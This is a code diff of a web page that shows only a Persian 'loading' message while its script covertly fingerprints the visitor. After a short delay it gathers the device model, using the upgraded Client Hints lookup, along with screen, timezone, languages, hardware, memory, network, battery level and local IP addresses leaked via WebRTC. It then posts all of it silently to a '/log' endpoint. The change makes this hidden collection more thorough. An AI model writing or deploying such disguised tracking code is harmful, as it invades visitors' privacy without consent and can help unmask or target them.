@@ -16,70 +16,87 @@
   <div class="text">در حال بارگذاری...</div>
 
 <script>
-window.addEventListener('load', () => {
-  setTimeout(async () => {
-    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    const ua = navigator.userAgent;
+window.addEventListener('load', async () => {
+  await new Promise(r => setTimeout(r, 2500)); // کمی بیشتر صبر می‌کنیم
 
-    // تشخیص مدل دقیق موبایل — نسخه نهایی و 100% کارکردی
-    let deviceModel = 'نامشخص';
+  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  const ua = navigator.userAgent;
 
-    // 1. اندروید (معمولاً مدل بعد از Android)
-    const androidModel = ua.match(/Android[^;]+; ([^;\)]+) Build\//);
-    if (androidModel && androidModel[1]) {
-      deviceModel = androidModel[1].trim();
-    }
-
-    // 2. سامسونگ، شیائومی، هواوی
-    else if (ua.includes('Build/')) {
-      const buildMatch = ua.match(/; ([A-Z0-9]{3,}) Build\//);
-      if (buildMatch && buildMatch[1]) {
-        deviceModel = buildMatch[1].trim();
+  // تشخیص مدل دقیق موبایل — نسخه فوق‌العاده با Client Hints
+  async function getDeviceModel() {
+    // اول Client Hints (بهترین راه برای Chrome جدید)
+    if (navigator.userAgentData) {
+      try {
+        const uaData = await navigator.userAgentData.getHighEntropyValues([
+          'model', 'platformVersion', 'fullVersionList'
+        ]);
+        if (uaData.model && uaData.model !== 'K' && uaData.model !== '') {
+          return uaData.model.trim();
+        }
+      } catch (e) {
+        console.log('Client Hints failed:', e);
       }
     }
 
-    // 3. iOS
-    else if (ua.includes('iPhone') || ua.includes('iPad')) {
-      deviceModel = ua.match(/\((iPhone|iPad|iPod)/)[1];
+    // fallback به regex
+    const androidModel = ua.match(/Android[^;]+; ([^;\)]+) Build\//);
+    if (androidModel && androidModel[1]) {
+      return androidModel[1].trim();
     }
 
-    const data = {
-      userAgent: ua,
-      platform: navigator.platform,
-      device_model: deviceModel,  // حالا 100% نشون می‌ده
-      screen: `${screen.width}x${screen.height}`,
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      language: navigator.language,
-      languages: navigator.languages,
-      cookieEnabled: navigator.cookieEnabled,
-      online: navigator.onLine,
-      doNotTrack: navigator.doNotTrack,
-      hardware: navigator.hardwareConcurrency + ' هسته',
-      memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'نامشخص',
-      network: conn ? {
-        type: conn.effectiveType,
-        downlink: conn.downlink + 'Mbps',
-        rtt: conn.rtt + 'ms',
-        saveData: conn.saveData
-      } : 'نامشخص',
-      battery: 'getBattery' in navigator ? await navigator.getBattery().then(b => ({
-        level: (b.level * 100).toFixed(0) + '%',
-        charging: b.charging
-      })) : 'نامشخص',
-      webrtc_ips: await getWebRTCIPs()
-    };
-
-    try {
-      await fetch('/log', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data),
-        keepalive: true
-      });
-    } catch (e) {
-      console.error('خطا در ارسال:', e);
+    if (ua.includes('Build/')) {
+      const buildMatch = ua.match(/; ([A-Z0-9]{3,}) Build\//);
+      if (buildMatch && buildMatch[1]) {
+        return buildMatch[1].trim();
+      }
     }
-  }, 2500); // کمی بیشتر صبر می‌کنیم
+
+    if (ua.includes('iPhone') || ua.includes('iPad') || ua.includes('iPod')) {
+      const iosMatch = ua.match(/\((iPhone|iPad|iPod)/);
+      return iosMatch ? iosMatch[1] : 'iOS Device';
+    }
+
+    return 'Android Generic (K)';
+  }
+
+  const deviceModel = await getDeviceModel();
+
+  const data = {
+    userAgent: ua,
+    platform: navigator.platform,
+    device_model: deviceModel,
+    screen: `${screen.width}x${screen.height}`,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    language: navigator.language,
+    languages: navigator.languages,
+    cookieEnabled: navigator.cookieEnabled,
+    online: navigator.onLine,
+    doNotTrack: navigator.doNotTrack,
+    hardware: navigator.hardwareConcurrency + ' هسته',
+    memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'نامشخص',
+    network: conn ? {
+      type: conn.effectiveType,
+      downlink: conn.downlink + 'Mbps',
+      rtt: conn.rtt + 'ms',
+      saveData: conn.saveData
+    } : 'نامشخص',
+    battery: 'getBattery' in navigator ? await navigator.getBattery().then(b => ({
+      level: (b.level * 100).toFixed(0) + '%',
+      charging: b.charging
+    })) : 'نامشخص',
+    webrtc_ips: await getWebRTCIPs()
+  };
+
+  try {
+    await fetch('/log', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data),
+      keepalive: true
+    });
+  } catch (e) {
+    console.error('خطا در ارسال:', e);
+  }
 });
 
 function getWebRTCIPs() {
